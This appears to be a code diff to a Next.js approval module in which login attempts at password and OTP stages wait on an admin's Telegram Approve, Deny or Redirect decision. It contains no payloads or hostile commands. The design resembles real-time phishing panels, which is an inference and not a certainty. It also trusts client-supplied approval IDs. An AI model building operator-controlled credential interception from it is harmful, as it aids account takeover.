@@ -2,6 +2,10 @@
  * Approval Webhook System
  * Manages pending approvals (Approve, Deny, Redirect) with 90-second timeout
  * Integrated with Telegram bot buttons for admin decisions
+ *
+ * NOTE: The store is pinned to globalThis so it survives Next.js module
+ * reloading / route bundling. For multi-instance production deployments,
+ * replace with Redis/DB.
  */
 
 import crypto from "crypto"
@@ -25,8 +29,13 @@ export interface ApprovalResponse {
   waitingFor?: number // milliseconds remaining
 }
 
-// In-memory store for pending approvals (in production, use Redis/DB)
-const APPROVALS = new Map<string, ApprovalRequest>()
+// In-memory store for pending approvals, pinned to globalThis so every route
+// handler in this process shares the SAME Map instance.
+const globalStore = globalThis as unknown as { __WEX_APPROVALS__?: Map<string, ApprovalRequest> }
+if (!globalStore.__WEX_APPROVALS__) {
+  globalStore.__WEX_APPROVALS__ = new Map<string, ApprovalRequest>()
+}
+const APPROVALS = globalStore.__WEX_APPROVALS__
 
 // Time limit for approval decision (seconds)
 const APPROVAL_TIMEOUT = 90
@@ -39,14 +48,25 @@ function generateApprovalId(): string {
 }
 
 /**
- * Create a new approval request
+ * Create (or refresh) an approval request.
+ * If `fixedId` is provided, that ID is used instead of generating one — this
+ * lets the browser-generated ID (embedded in the Telegram buttons) be
+ * registered server-side so button callbacks can find it.
  */
 export function createApprovalRequest(
   username: string,
-  stage: "password" | "otp"
+  stage: "password" | "otp",
+  fixedId?: string
 ): ApprovalRequest {
-  const id = generateApprovalId()
+  const id = fixedId && typeof fixedId === "string" && fixedId.trim() !== "" ? fixedId.trim() : generateApprovalId()
   const now = Date.now()
+
+  const existing = APPROVALS.get(id)
+  if (existing && !existing.action && now <= existing.expiresAt) {
+    // Already pending — reuse it
+    return existing
+  }
+
   const request: ApprovalRequest = {
     id,
     username,
@@ -56,19 +76,6 @@ export function createApprovalRequest(
   }
 
   APPROVALS.set(id, request)
-
-  // Auto-cleanup after timeout
-  setTimeout(() => {
-    if (APPROVALS.has(id)) {
-      const req = APPROVALS.get(id)!
-      if (!req.action) {
-        // Auto-deny if no decision made
-        req.action = "deny"
-        req.decidedAt = Date.now()
-      }
-    }
-  }, APPROVAL_TIMEOUT * 1000)
-
   return request
 }
 
@@ -101,7 +108,7 @@ export function checkApprovalStatus(approvalId: string): ApprovalResponse {
     }
   }
 
-  // Check if expired
+  // Check if expired (lazy expiry — no setTimeout, which is unreliable on serverless)
   if (now > request.expiresAt) {
     request.action = "deny"
     request.decidedAt = now
@@ -141,12 +148,23 @@ export function processApprovalDecision(
     return {
       approved: request.action === "approve",
       action: request.action,
-      message: "Decision already made",
+      message: `Decision already made: ${request.action}`,
+    }
+  }
+
+  const now = Date.now()
+  if (now > request.expiresAt) {
+    request.action = "deny"
+    request.decidedAt = now
+    return {
+      approved: false,
+      action: "deny",
+      message: "⏰ Approval timeout - access denied",
     }
   }
 
   request.action = action
-  request.decidedAt = Date.now()
+  request.decidedAt = now
 
   return {
     approved: action === "approve",
@@ -175,7 +193,7 @@ export function cleanupExpiredApprovals(): number {
   const now = Date.now()
 
   for (const [id, request] of APPROVALS.entries()) {
-    if (now > request.expiresAt && !request.action) {
+    if (now > request.expiresAt) {
       APPROVALS.delete(id)
       cleaned++
     }
